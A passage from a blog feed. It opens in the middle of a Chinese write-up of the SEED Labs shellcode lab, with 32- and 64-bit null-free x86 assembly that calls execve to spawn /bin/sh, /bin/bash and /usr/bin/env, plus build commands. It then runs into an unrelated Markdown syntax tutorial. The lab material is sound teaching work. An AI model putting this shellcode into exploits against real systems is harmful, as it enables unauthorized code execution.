class="string">&quot;/bin&quot;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="string">&quot;/usr&quot;</span></span><br><span class="line">      <span class="keyword">mov</span>  <span class="built_in">ebx</span>, <span class="built_in">esp</span>     <span class="comment">; Get the string address</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">; Construct the argument array argv[]</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">eax</span>          <span class="comment">; argv[1] = 0</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">ebx</span>          <span class="comment">; argv[0] points &quot;/usr/bin/env&quot;</span></span><br><span class="line">      <span class="keyword">mov</span>  <span class="built_in">ecx</span>, <span class="built_in">esp</span>     <span class="comment">; Get the address of argv[]</span></span><br><span class="line">   </span><br><span class="line">      <span class="comment">; Invoke execve()</span></span><br><span class="line">      <span class="keyword">xor</span>  <span class="built_in">eax</span>, <span class="built_in">eax</span>     <span class="comment">; eax = 0x00000000</span></span><br><span class="line">      <span class="keyword">mov</span>   <span class="built_in">al</span>, <span class="number">0x0b</span>    <span class="comment">; eax = 0x0000000b</span></span><br><span class="line">      <span class="keyword">int</span> <span class="number">0x80</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>6.重新编译运行后的结果如下：</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133010329.png" alt="image-20251111170945267"></p><h3 id="Task-2-Using-Code-Segment">Task 2: Using Code Segment</h3><p>我们可以从任务 1 中的 shellcode 看到，它解决数据地址问题的方法是在堆栈上动态构建所有必要的数据结构，这样就可以从堆栈指针 esp 中获取它们的地址。</p><p>还有另一种方法可以解决同样的问题，即获取所有必要数据结构的地址。在这种方法中，数据存储在代码区中，其地址通过函数调用机制获取。让我们看看下面的代码。</p><p>上面的代码首先跳转到位置 2 的指令，然后执行另一次跳转（跳转到位置 1），但这次使用的是调用指令。这条指令用于函数调用，即在跳转到目标位置之前，先记录下一条指令的地址作为返回地址，这样当函数返回时，就可以返回到调用指令之后的指令。</p><p>在本例中，调用指令后的 “指令”（第 ➋ 行）实际上不是指令，而是存储字符串的指令。不过，这并不重要，调用指令会将其地址（即字符串的地址）推入堆栈，即函数帧的返回地址字段。当我们进入函数时，即跳转到位置 1 后，栈顶就是存储返回地址的地方。因此，第➊行的 pop ebx 指令实际上是获取第➋行的字符串地址，并将其保存到 ebx 寄存器中。这就是字符串地址的获取方式。</p><p>第 ➋ 行的字符串并不是一个完整的字符串，它只是一个占位符。程序需要在这个占位符中构建所需的数据结构。既然已经获得了字符串的地址，那么在这个占位符内构建的所有数据结构的地址都可以很容易地推导出来。</p><p>如果我们想获得可执行文件，就需要在运行链接程序 (ld) 时使用 --omagic 选项，这样代码段才是可写的。默认情况下，代码段是不可写的。程序运行时，需要修改代码段中存储的数据；如果代码段不可写，程序就会崩溃。这对实际攻击来说不是问题，因为在攻击中，代码通常被注入到可写数据段（如堆栈或堆）中。我们通常不会将 shellcode 作为独立程序运行。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf32 mysh2<span class="selector-class">.s</span> -o mysh2<span class="selector-class">.o</span></span><br><span class="line">$ ld <span class="attr">--omagic</span> -m elf_i386 mysh2<span class="selector-class">.o</span> -o mysh2</span><br></pre></td></tr></table></figure><p><strong>任务</strong>： 您需要完成以下工作：（1）请从标有 1 的一行开始，详细解释 mysh2.s 中的每一行代码。(2) 请使用 mysh2.s 中的技术实现一个新的 shellcode，使其执行 /usr/bin/env，并打印出以下环境变量：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">a</span><span class="operator">=</span><span class="number">11</span></span><br><span class="line"><span class="attribute">b</span><span class="operator">=</span><span class="number">22</span></span><br></pre></td></tr></table></figure><p><strong>任务一</strong>：详细解释 mysh2.s 中的代码：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">section</span> .text</span><br><span class="line"><span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line">    <span class="meta">BITS</span> <span class="number">32</span></span><br><span class="line">    <span class="keyword">jmp</span> short two</span><br><span class="line"><span class="symbol">one:</span></span><br><span class="line">    <span class="keyword">pop</span> <span class="built_in">ebx</span>  <span class="comment">; 从栈中弹出一个值到 ebx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>  <span class="comment">; 将 eax 置为 0</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="built_in">ebx</span>+<span class="number">7</span>], <span class="built_in">al</span>  <span class="comment">; 将 0x00 保存到 ebx + 7 的内存地址</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="built_in">ebx</span>+<span class="number">8</span>], <span class="built_in">ebx</span>  <span class="comment">; 将 ebx 的值保存到 ebx + 8 的内存地址</span></span><br><span class="line">    <span class="keyword">mov</span> [<span class="built_in">ebx</span>+<span class="number">12</span>], <span class="built_in">eax</span>  <span class="comment">; 将 0 保存到 ebx + 12 的内存地址</span></span><br><span class="line">    <span class="keyword">lea</span> <span class="built_in">ecx</span>, [<span class="built_in">ebx</span>+<span class="number">8</span>]  <span class="comment">; 将 ebx + 8 的地址存入 ecx</span></span><br><span class="line">    <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span>  <span class="comment">; 将 edx 置为 0</span></span><br><span class="line">    <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x0b</span>  <span class="comment">; 设置系统调用号为 execve</span></span><br><span class="line">    <span class="keyword">int</span> <span class="number">0x80</span>  <span class="comment">; 触发中断，调用系统</span></span><br><span class="line"><span class="symbol">two:</span></span><br><span class="line">    <span class="keyword">call</span> one  <span class="comment">; 调用 one 标签的代码</span></span><br><span class="line">    <span class="built_in">db</span> <span class="string">&#x27;/bin/sh*AAAABBBB&#x27;</span>  <span class="comment">; 定义字符串及填充数据*</span></span><br></pre></td></tr></table></figure><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">section</span> .text: 定义代码段，表示接下来的内容是可执行代码。</span><br><span class="line"><span class="meta">global</span> _start: 声明 _start 为全局符号，操作系统会从这里开始执行程序。</span><br><span class="line"><span class="symbol">_start:</span> 入口点，程序开始执行的地方。</span><br><span class="line"><span class="meta">BITS</span> <span class="number">32</span>: 指明接下来的代码是为 <span class="number">32</span> 位处理器编写的。</span><br><span class="line"><span class="keyword">jmp</span> short two: 无条件跳转到 two 标签。该指令会直接跳过 one 标签的代码。</span><br><span class="line"><span class="symbol">one:</span>标签 one 的开始，后面的代码会被 <span class="keyword">call</span> one 调用。</span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">ebx</span>:从栈顶弹出一个值到寄存器 <span class="built_in">ebx</span>。这个值通常是指向字符串的地址，程序执行时会将该值放入栈中。</span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>: 将 <span class="built_in">eax</span> 寄存器的值置为 <span class="number">0</span>。这里用于清空 <span class="built_in">eax</span>，为后续操作做准备。</span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">ebx</span>+<span class="number">7</span>], <span class="built_in">al</span>:将 <span class="built_in">al</span> 寄存器中的值（此时是 <span class="number">0</span>）存储到 <span class="built_in">ebx</span> + <span class="number">7</span> 的内存地址。此操作在字符串 ‘/bin/sh’ 的后面添加一个空字符（<span class="number">0x00</span>），标识字符串的结束。</span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">ebx</span>+<span class="number">8</span>], <span class="built_in">ebx</span>:将 <span class="built_in">ebx</span> 的值（指向 ‘/bin/sh’ 的地址）存储到 <span class="built_in">ebx</span> + <span class="number">8</span> 的内存地址。这个地址将作为 argv（命令行参数数组）的位置。</span><br><span class="line"><span class="keyword">mov</span> [<span class="built_in">ebx</span>+<span class="number">12</span>], <span class="built_in">eax</span>: 将 <span class="built_in">eax</span>（此时是 <span class="number">0</span>）存储到 <span class="built_in">ebx</span> + <span class="number">12</span> 的内存地址。这表示没有环境变量（envp）。</span><br><span class="line"><span class="keyword">lea</span> <span class="built_in">ecx</span>, [<span class="built_in">ebx</span>+<span class="number">8</span>]:将 <span class="built_in">ebx</span> + <span class="number">8</span> 的地址加载到 <span class="built_in">ecx</span>。这将是指向参数数组的地址。</span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span>: 将 <span class="built_in">edx</span> 寄存器清零，表示没有环境变量。</span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x0b</span>: 将 <span class="number">0x0b</span>（对应于 execve 系统调用的调用号）放入 <span class="built_in">al</span> 寄存器，准备进行系统调用。</span><br><span class="line"><span class="keyword">int</span> <span class="number">0x80</span>: 触发中断，调用操作系统的服务。此处将会执行 execve 系统调用，启动新的进程 /bin/sh。</span><br><span class="line"><span class="symbol">two:</span>标签 two 的开始。</span><br><span class="line"><span class="keyword">call</span> one: 调用 one 标签的代码，执行其中的指令，准备参数并进行系统调用。</span><br><span class="line"><span class="built_in">db</span> <span class="string">&#x27;/bin/sh*AAAABBBB&#x27;</span>:定义字符串 ‘/bin/sh’，后面的 *AAAABBBB 用于填充和对齐内存，以确保数据的正确性。<span class="built_in">db</span> 是定义字节的伪指令。</span><br></pre></td></tr></table></figure><p><strong>任务二</strong>： 实现一个 shellcode，使其执行 /usr/bin/env，并打印出环境变量。</p><p>1.首先，我们需要构造三个参数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filename = <span class="string">&quot;/usr/bin/env&quot;</span></span><br><span class="line">argv[] = &#123;<span class="string">&quot;/usr/bin/env&quot;</span>, <span class="literal">NULL</span>&#125;</span><br><span class="line">env[] = &#123;address <span class="keyword">to</span> <span class="string">&quot;a=11&quot;</span>,<span class="built_in"> address </span><span class="keyword">to</span> <span class="string">&quot;b=22&quot;</span>, <span class="literal">NULL</span>&#125;</span><br></pre></td></tr></table></figure><p>2.参考mysh2.s，定义数据应该为db '/usr/bin/env<em>NNNNDDDDa=11</em>b=22<em>AAAABBBBNNNN’<br>注：</em> 代表后续应该用1 byte的0替代的位置，表示字符串的结尾。NNNN表示4 bytes的0需要替代的位置，表示数组中的NULL，AAAA和BBBB分别表示a=11和b=22的地址</p><p>3.完整代码如下所示：</p><pre><code>section .text  global _start    _start:BITS 32jmp short two    one: pop ebx ;command address xor eax, eax mov [ebx+12], al ;string 0 terminalmov [ebx+13], ebxmov [ebx+17], eax ;argv[1] = 0lea ecx, [ebx+13] ;argv[]  mov [ebx+25], al mov [ebx+30], allea edx, [ebx+21] ;points 'a=11'mov [ebx+31], edxlea edx, [ebx+26] ;points 'b=22'mov [ebx+35], edxmov [ebx+39], eaxlea edx, [ebx+31] ;xor edx, edx;lea edx, [ebx+13] mov al,  0x0b int 0x80     two: call one;   0   4   8   23   7   1   56   01   5   9 db '/usr/bin/env*NNNNDDDDa=11*b=22*AAAABBBBNNNN'</code></pre><p>4.编译运行结果如下</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133011116.png" alt="image-20251111172827972"></p><h3 id="Task-3-Writing-64-bit-Shellcode">Task 3: Writing 64-bit Shellcode</h3><p>编写 64 位 shellcode ，与编写 32 位 shellcode 相似；区别主要在于寄存器。在 x64 架构中，调用系统调用是通过 syscall 指令完成的，系统调用的前三个参数分别存储在 rdx、rsi 和 rdi 寄存器中。下面是一个 64 位 shellcode 的示例：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">section</span> .text</span><br><span class="line"><span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">_start:</span></span><br><span class="line"><span class="comment">; The following code calls execve(&quot;/bin/sh&quot;, ...)</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rdx</span>, <span class="built_in">rdx</span> <span class="comment">; 3rd argument (stored in rdx)</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">rdx</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rax</span>,’/bin//sh’</span><br><span class="line"><span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span> <span class="comment">; 1st argument (stored in rdi)</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">rdx</span></span><br><span class="line"><span class="keyword">push</span> <span class="built_in">rdi</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span> <span class="comment">; 2nd argument (stored in rsi)</span></span><br><span class="line"><span class="keyword">xor</span> <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x3b</span> <span class="comment">; execve()</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure><p>我们可以使用以下命令将汇编代码编译成 64 位二进制代码：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nasm <span class="operator">-f</span> elf64 mysh_64.s <span class="literal">-o</span> mysh_64.o</span><br><span class="line"><span class="variable">$</span> ld mysh_64.o <span class="literal">-o</span> mysh_64</span><br></pre></td></tr></table></figure><p><strong>任务内容</strong>： 对 64 位 的 shellcode 执行“/bin/bash”，而不是“/bin/sh”，并且不允许在命令字符串中使用任何多余的“/”，即命令长度必须为 9 字节（/bin/bash）。请演示如何做到这一点。除了证明您可以得到一个 bash shell 外，您还需要证明您的代码中没有 0。</p><p>1.修改代码如下</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">section</span> .text</span><br><span class="line">  <span class="meta">global</span> _start</span><br><span class="line"><span class="symbol">    _start:</span></span><br><span class="line">      <span class="comment">; The following code calls execve(&quot;/bin/sh&quot;, ...)</span></span><br><span class="line">      <span class="keyword">xor</span>  <span class="built_in">rdx</span>, <span class="built_in">rdx</span>       <span class="comment">; 3rd argument</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="string">&#x27;h&#x27;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">rax</span>,</span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">rax</span>, <span class="string">&#x27;/bin/bas&#x27;</span></span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">rax</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">rdi</span>, <span class="built_in">rsp</span>        <span class="comment">; 1st argument</span></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">rdx</span> </span><br><span class="line">      <span class="keyword">push</span> <span class="built_in">rdi</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">rsi</span>, <span class="built_in">rsp</span>        <span class="comment">; 2nd argument</span></span><br><span class="line">      <span class="keyword">xor</span>  <span class="built_in">rax</span>, <span class="built_in">rax</span></span><br><span class="line">      <span class="keyword">mov</span> <span class="built_in">al</span>, <span class="number">0x3b</span>        <span class="comment">; execve()</span></span><br><span class="line">      <span class="keyword">syscall</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.编译运行结果如下</p><p><img src="https://potatojiang.oss-cn-chengdu.aliyuncs.com/20251211133012283.png" alt="image-20251111175102884"></p>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Seed-Labs </tag>
            
            <tag> Shellcode </tag>
            
            <tag> Assembly </tag>
            
            <tag> Binary Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown语法与外挂标签写法汇总</title>
      <link href="/posts/2013454d.html"/>
      <url>/posts/2013454d.html</url>
      
        <content type="html"><![CDATA[<h1>1.Markdown语法自带格式</h1><div class="note info flat"><p>参考：<a href="https://blog.csdn.net/u014061630/article/details/81359144">Markdown语法图文全面详解(10分钟学会)</a></p></div><div class="note warning flat"><p>注意：此页面偶尔会存在CSS冲突问题!</p></div><h2 id="1-1-代码块">1.1 代码块</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\```shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br><span class="line">\```</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">VSCode终端</span></span><br><span class="line">hexo clean; hexo s</span><br><span class="line">hexo clean; hexo g; hexo d</span><br><span class="line">git add .; git commit -m &quot;npm publish&quot;; npm version patch; </span><br><span class="line">git push</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Cmder终端</span></span><br><span class="line">hexo clean &amp;&amp; hexo s</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br><span class="line">git add . &amp;&amp; git commit -m &quot;npm publish&quot; &amp;&amp; npm version patch</span><br><span class="line">git push</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-2-多级标题">1.2 多级标题</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># H1</span></span><br><span class="line"><span class="section">## H2</span></span><br><span class="line"><span class="section">### H3</span></span><br><span class="line"><span class="section">#### H4</span></span><br><span class="line"><span class="section">##### H5</span></span><br><span class="line"><span class="section">###### H6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>见本文章标题!</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-3-文字样式">1.3 文字样式</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">u</span>&gt;</span></span>下划线演示<span class="language-xml"><span class="tag">&lt;/<span class="name">u</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">文字<span class="strong">**加粗**</span>演示</span><br><span class="line"></span><br><span class="line">文字<span class="emphasis">*斜体*</span>演示</span><br><span class="line"></span><br><span class="line">文本<span class="code">`高亮`</span>演示</span><br><span class="line"></span><br><span class="line">文本~~删除~~线演示</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span> = <span class="string">5</span>&gt;</span></span>5号字<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">face</span>=<span class="string">&quot;黑体&quot;</span>&gt;</span></span>黑体<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">blue</span>&gt;</span></span>蓝色<span class="language-xml"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;<span class="name">td</span> <span class="attr">bgcolor</span>=<span class="string">MistyRose</span>&gt;</span></span>这里的背景色是：MistyRosen，此处输入任意想输入的内容<span class="language-xml"><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><span class="language-xml"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><u>下划线演示</u></p><p>文字<strong>加粗</strong>演示</p><p>文字<em>斜体</em>演示</p><p>文本<code>高亮</code>演示</p><p>文本<s>删除</s>线演示</p><p><font size = 5>5号字</font><br><font face="黑体">黑体</font><br><font color=blue>蓝色</font></p><table><tr><td bgcolor=MistyRose>这里的背景色是：MistyRosen，此处输入任意想输入的内容</td></tr></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><div class="note info flat"><p>上述要点可参考:<a href="https://blog.csdn.net/qq_43732429/article/details/108034518">【Markdown语法】字体颜色大小及文字底色设置</a></p></div><h2 id="1-4-引用">1.4 引用</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="quote">&gt;  Java</span></span><br><span class="line"><span class="quote">&gt; 二级引用演示</span></span><br><span class="line"><span class="quote">&gt; MySQL</span></span><br><span class="line"><span class="quote">&gt; &gt;外键</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;事务</span></span><br><span class="line"><span class="quote">&gt; &gt;</span></span><br><span class="line"><span class="quote">&gt; &gt;<span class="strong">**行级锁**</span>(引用内部一样可以用格式)</span></span><br><span class="line"><span class="quote">&gt; </span></span><br><span class="line"><span class="quote">&gt; ....</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><blockquote><p>Java<br>二级引用演示<br>MySQL</p><blockquote><p>外键</p><p>事务</p><p><strong>行级锁</strong>(引用内部一样可以用格式)</p></blockquote><p>…</p></blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-5-分割线">1.5 分割线</h2><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="strong">**<span class="emphasis">*</span></span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><hr><hr><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="1-6-列表-跟空格都可以">1.6 列表(*,+,-跟空格都可以)</h2><h3 id="1-6-1-无序列表">1.6.1 无序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> Java</span><br><span class="line"><span class="bullet">*</span> Python</span><br><span class="line"><span class="bullet">*</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> Java</span><br><span class="line"><span class="bullet">+</span> Python</span><br><span class="line"><span class="bullet">+</span> ...</span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> Java</span><br><span class="line"><span class="bullet">-</span> Python</span><br><span class="line"><span class="bullet">-</span> ...</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><ul><li>Java</li><li>Python</li><li>…</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="1-6-2-有序列表">1.6.2 有序列表</h3><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例源码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># 注意后面有空格</span></span><br><span class="line"><span class="bullet">1.</span> </span><br><span class="line"><span class="bullet">2.</span> </span><br><span class="line"><span class="bullet">3.</span> </span><br><span class="line"><span class="bullet">4.</span> </span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" 